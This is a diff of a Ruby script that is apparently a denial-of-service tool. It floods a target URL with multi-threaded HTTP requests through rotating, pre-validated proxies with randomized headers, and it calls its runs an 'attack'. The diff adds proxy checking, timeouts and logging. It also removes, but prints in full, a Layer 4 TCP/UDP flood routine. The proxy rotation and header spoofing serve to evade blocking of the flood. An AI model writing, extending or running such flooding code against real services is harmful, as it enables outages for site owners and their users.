@@ -52,11 +52,42 @@ def generate_headers
   }
 end
 
+# Validate proxies before use
+def validate_proxies(proxies)
+  valid_proxies = []
+  test_url = "https://example.com"
+
+  proxies.each do |proxy|
+    begin
+      uri = URI.parse(test_url)
+      proxy_uri = URI.parse("http://#{proxy}")
+      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
+      http.use_ssl = (uri.scheme == "https")
+      http.open_timeout = 5
+      http.read_timeout = 5
+
+      response = http.get(uri.request_uri)
+      if response.code.to_i == 200
+        puts green_bold("[+] Valid proxy: #{proxy}")
+        valid_proxies << proxy
+      else
+        puts red_bold("[-] Invalid proxy: #{proxy}")
+      end
+    rescue
+      puts red_bold("[-] Failed to connect: #{proxy}")
+    end
+  end
+
+  valid_proxies
+end
+
 # Layer 7: Send HTTP/HTTPS requests
 def send_request(url, method, proxy = nil, headers = {})
   uri = URI.parse(url)
   http = Net::HTTP.new(uri.host, uri.port)
   http.use_ssl = (uri.scheme == "https")
+  http.open_timeout = 5 # Timeout for opening a connection
+  http.read_timeout = 5 # Timeout for reading response
 
   if proxy
     proxy = "http://#{proxy}" unless proxy.start_with?("http://", "https://")
@@ -77,42 +108,13 @@ def send_request(url, method, proxy = nil, headers = {})
               end
 
     response = http.request(request)
+    puts green_bold("[*] Request sent via #{proxy || 'direct'} - Response: #{response.code}")
     return response.code.to_i, proxy if response.code.to_i == 200 # Only return 200 responses
     return nil, proxy
   rescue => e
+    puts red_bold("[!] Request failed via proxy #{proxy || 'direct'}: #{e.message}")
     return nil, proxy
   end
-end
-
-# Layer 4: TCP/UDP Flood
-def flood_layer4(target_ip, target_port, protocol, threads, duration)
-  puts green_bold("[+] Starting Layer 4 attack on #{target_ip}:#{target_port} with protocol #{protocol.upcase}")
-  end_time = Time.now + duration
-
-  threads.times do
-    Thread.new do
-      while Time.now < end_time
-        begin
-          case protocol.downcase
-          when "tcp"
-            socket = TCPSocket.new(target_ip, target_port)
-            socket.write("FloodData#{rand(1000)}")
-            socket.close
-          when "udp"
-            socket = UDPSocket.new
-            socket.send("FloodData#{rand(1000)}", 0, target_ip, target_port)
-            socket.close
-          else
-            raise red_bold("[!] Unsupported protocol: #{protocol}")
-          end
-        rescue => e
-          puts red_bold("[!] Error: #{e.message}")
-        end
-      end
-    end
-  end.each(&:join)
-
-  puts green_bold("[+] Layer 4 attack completed.")
 end
 
 # Perform the stress test for Layer 7
@@ -127,9 +129,13 @@ def stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay
         proxy = proxies.any? ? proxies_cycle.next : nil
         headers = generate_headers
 
+        puts green_bold("[*] Sending request via #{proxy || 'direct'}...")
         response_code, used_proxy = send_request(url, method, proxy, headers)
+
         if response_code == 200
-          puts green_bold("[+] Request sent via #{used_proxy || 'direct connection'} - Response: 200")
+          puts green_bold("[+] Successful response via #{used_proxy || 'direct connection'}")
+        else
+          puts red_bold("[-] Failed request via #{used_proxy || 'direct connection'}")
         end
 
         sleep(delay / 1000.0) # Convert delay from ms to seconds
@@ -162,7 +168,7 @@ OptionParser.new do |opts|
     options[:proxy_file] = proxy_file
   end
 
-  opts.on("-m", "--method METHOD", "HTTP method to use for Layer 7 (GET, POST, HEAD, etc.)") do |method|
+  opts.on("-m", "--method METHOD", "HTTP method for Layer 7 (GET, POST, HEAD, etc.)") do |method|
     options[:method] = method
   end
 
@@ -170,20 +176,8 @@ OptionParser.new do |opts|
     options[:delay] = delay
   end
 
-  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 4 (Transport Layer), 7 (Application Layer)") do |layer|
+  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 7 (Application Layer)") do |layer|
     options[:layer] = layer
-  end
-
-  opts.on("--protocol PROTOCOL", "Protocol to use for Layer 4 (TCP, UDP)") do |protocol|
-    options[:protocol] = protocol
-  end
-
-  opts.on("--port PORT", Integer, "Port to target for Layer 4") do |port|
-    options[:port] = port
-  end
-
-  opts.on("--duration DURATION", Integer, "Duration of Layer 4 attack in seconds") do |duration|
-    options[:duration] = duration
   end
 end.parse!
 
@@ -200,9 +194,6 @@ proxy_file = options[:proxy_file]
 method = options[:method] || "GET"
 delay = options[:delay] || 100
 layer = options[:layer] || 7
-protocol = options[:protocol] || "tcp"
-port = options[:port] || 80
-duration = options[:duration] || 60
 
 # Load proxies if provided
 proxies = []
@@ -212,6 +203,7 @@ if proxy_file
     proxies = File.readlines(proxy_file).map(&:strip)
     proxy_enabled = true
     puts green_bold("[+] Loaded #{proxies.size} proxies from #{proxy_file}")
+    proxies = validate_proxies(proxies) # Validate proxies
   rescue Errno::ENOENT
     puts red_bold("[!] Error: Proxy file not found.")
     exit
@@ -224,9 +216,6 @@ attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, 
 
 if layer == 7
   stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay)
-elsif layer == 4
-  target_ip = URI.parse(url).host rescue url # Extract IP from URL
-  flood_layer4(target_ip, port, protocol, threads, duration)
 else
-  puts red_bold("[!] Invalid layer specified. Choose 4 or 7.")
+  puts red_bold("[!] Invalid layer specified. Currently supports only Layer 7.")
 end
